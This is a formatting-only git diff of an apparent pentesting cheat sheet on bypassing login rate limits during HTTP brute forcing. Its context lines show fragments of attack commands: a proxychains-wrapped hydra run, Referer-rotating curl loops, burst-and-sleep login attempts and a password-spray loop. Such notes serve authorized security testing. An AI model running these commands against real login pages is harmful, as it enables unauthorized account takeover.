@@ -17,7 +17,7 @@ linked:
 ---
 # HTTP Brute Forcing - Bypass de Rate-Limit
 
-***
+---
 
 ## IP Rotation
 
@@ -49,7 +49,7 @@ http   5.6.7.8 8080
 proxychains -q hydra -L users.txt -P pass.txt target.com http-post-form ...
 ```
 
-___
+---
 
 ## Header Spoofing (X-Forwarded-For etc)
 
@@ -80,7 +80,7 @@ for i in {1..255}; do
 done
 ```
 
-___
+---
 
 ## User-Agent + Session Rotation
 
@@ -97,7 +97,7 @@ ___
 | `for r in https://google.com https://target.com/home https://target.com/about; do curl -H "Referer: $r" -d "..." https://target/login; done` | Referer rotation | Referer fingerprint. |
 ^bf-bypass-uasession
 
-___
+---
 
 ## Timing Distribution
 
@@ -113,7 +113,7 @@ ___
 | `for i in {1..10}; do (curl -d "user=admin&pass=$PASS_$i" https://target/login &); done; wait; sleep 600` | Burst N + sleep 10min | Reset counter window. |
 ^bf-bypass-timing
 
-___
+---
 
 ## Endpoint / Account Rotation
 
@@ -146,4 +146,4 @@ for pass in "Password2025!" "Welcome1!" "Spring2025"; do
 done
 ```
 
-***
+---
